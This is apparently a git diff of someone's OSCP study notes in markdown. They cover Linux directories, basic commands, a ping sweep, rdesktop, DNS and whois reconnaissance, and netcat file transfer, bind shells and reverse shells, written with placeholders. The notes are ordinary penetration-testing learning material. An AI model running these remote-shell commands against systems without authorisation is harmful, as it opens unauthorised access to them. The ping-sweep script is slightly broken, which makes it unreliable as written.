@@ -1,7 +1,6 @@
 <div align="center">
 <h1 style="color:red;font-size:10px;">OSCP 2020</h1>
-  <b>OSCP 2020</b><br>
-
+ 
  <img src="oscp1.png">
 </div>
 
@@ -9,33 +8,33 @@
 
 ## System structure:
 
-** /bin **
- 
-this contains the basic programs (ls, cd, cat, etc.)
+**/bin**
+ this contains the basic programs (ls, cd, cat, etc.)
 
-** /sbin **
 
+**/sbin**
 this contains the system programs (fdisk, mkfs, sysctl, etc)
 
-** /etc **
 
+**/etc**
 this contains the configuration files
 
-** /tmp **
 
+**/tmp**
 this contains the temp files (typically deleted on boot)
 
-** /usr/bin **
 
+**/usr/bin**
 this contains the user  applications (apt, ncat, nmap, etc.)
 
-** /usr/share **
 
+**/usr/share**
 this contains the application support and data files
 
-# useful commands:
 
-## search the man pages
+## useful commands:
+
+### search the man pages
 
 ```
 $ apropos [keyword]
@@ -47,15 +46,14 @@ $  man -k [keyword]
 used to search in man pages for command based on it's function 
 
  
-# Find File:
+### Find File:
 
 **locate**
-```
-$ updatedb
-```
+
 to update the file index database
 
 ```
+$ updatedb
 $ locate [filename]
 ```
 **which**
@@ -74,7 +72,7 @@ powerfull search tool with many arguments
 $ find [search location]  -name [filename] -exec file "{}"\;
 ```
 
-# Service managent:
+## Service managent:
 
 to chick service status:
 
@@ -86,7 +84,7 @@ where a= all, n= numirecal, t= TCP, l= listning, and p= process
 # service [service name] [option]
 
 ```
-option could be : start, stop, or restart
+option could be: start, stop, or restart
 
 alternatevly you can use:
 
@@ -150,6 +148,13 @@ to redirect STDERR " the command error MSG"
 
 ```
 $ command 2> file 
+```
+
+# direct error to null screen (do not show errors)
+
+```
+command 2>/dev/null
+
 ```
 
 the duble > ">>" in redirection means contanue on the file, while a single ">" means overright the file if it existing
@@ -287,60 +292,45 @@ if you get error *ERROR: The certificate of ‘www.cisco.com’ is not trusted.*
 
 other method:
 
-``
+```
 cat index.html |grep 'http://[^"]*' | cut -d "/" -f 3 |sort -u
 ```
 
-# direct error to null screen (do not show errors)
+
+
+
+## login with ssh-private key
 
 ```
-command 2>/dev/null
-
-```
-where:
-
-stdin – 0 – Standard Input (usually keyboard or file)
-
-stdout – 1 – Standard Output (usually screen)
-
-stderr – 2 – Standard Error (usually screen)
-
-
-# Reverse Hex Dump:
-
-```
-xxd -r file > output
-```
-# login with ssh-private key
-
-```
-ssh -i [key file path] user@host
+ssh -i [key file path] [user]@[host]
 
 ```
 
-# ping sweeper:
+## ping sweeper:
 
 ```
 #! /bin/bash
-```
+
 for ip in $(1 255) do
 ping 192.168.1.$ip | grep "bytes from" | cut -d " " -f4 | cut -d ":" -f1 &
 ```
 
 the & is to send each command to background and run the next on in the loop
 
-# Rdisktop
+# Remote Login:
+
+## Rdisktop
 
 ```
-rdisktop -u *username* -p *password* *hostname/ip*
+$rdisktop -u *username* -p *password* *hostname/ip*
 ```
 
-# NetCat
+## NetCat
 
 on server side:
 
 ```
-nc -nlp *port*
+$nc -nlp [port]
 ```
 n stands for numerical host ( no DNS)
 l stands for listen
@@ -349,7 +339,7 @@ p stands for port
 on clinet side:
 
 ```
-nc -n *netcat Server machine IP address* *port*
+$nc -n [netcat Server machine IP address] [port]
 ```
 
 the port is the server spacified port number 
@@ -357,54 +347,79 @@ the port is the server spacified port number
 
 NetCat file transfare:
 
+server side (sender):
+
 ```
-server side:
-nc -npl *port* > *name for the recived file*
+$nc -npl [port] > [name for the recived file]
+```
 
 client side:
-nc -n *serverIP* *serverport* < *path of the file to be send*
-```
-NetCat Remote Execution:
 
 ```
+$nc -n [serverIP] [server port] < [path of the file to be send]
+```
+
+NetCat Remote Execution:
+
 **forword command execution(Bind Shell)**
+
 server side:
-nc -lp *port* -e *full path of command to be executed*
+
+```
+$nc -lp [port] -e [full path of command to be executed]
+```
+
 clinet side:
-nc -n *serverIP* *serverport*
+
+```
+$nc -n [serverIP] [serve rport]
+```
+
 **revirce shell**
+
 server side:
-nc -lp *port*
+
+```
+nc -lp [port]
+```
 clinet side:
+
+```
 nc -n *serverIP* *serverPort* -e *full path of command to be executed*
 ```
 # Reconnaissance:
 
-Pasive:
+## Pasive Reconnaissance:
 
 ```
-theHarvester -d *domainname* -b google
+theHarvester -d [domainname] -b google
 
 ```
+
+used to Harviste serch engens for data about the target domain
+
 you can use any other search engen to search in
 
+see the help for parameters
+
 ```
-whois *domainname* OR *IP*
+whois [domain name] OR [IP]
 ```
 
 
-DNS Enumeration:
+### DNS Enumeration:
 
 ``` 
-host *internet hostname*
+host [internet hostname]
 ```
 
 that would resolve the hostname to an IP address
 
 ```
-host -t *DNS recired type* *domain*
-
-recored type such as: ns, mx, a, and aaaa
+host -t [DNS recired type] [domain]
 ```
 
-Note -A insted of -t gets all the recoreds ns, mx, a, and aaaa recoreds
+recored type such as: ns, mx, a, and aaaa
+
+
+Note -a insted of -t gets all the recoreds ns, mx, a, and aaaa recoreds
